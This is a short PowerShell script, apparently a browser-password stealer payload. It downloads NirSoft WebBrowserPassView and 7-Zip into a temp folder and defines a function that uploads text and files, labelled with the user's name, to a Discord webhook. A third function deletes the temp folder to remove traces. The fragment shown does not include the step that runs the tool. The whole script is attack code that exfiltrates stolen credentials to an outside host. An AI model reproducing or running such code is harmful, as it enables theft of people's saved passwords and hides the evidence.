$desktop = ([Environment]::GetFolderPath("Desktop"))
function Get-Nirsoft {
  mkdir \temp 
  cd \temp
  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip 
  .\7z\7za.exe e wbpv.zip
}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)


$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
}

 function Del-Nirsoft-File {
  cd C:\
  rmdir -R \temp
}
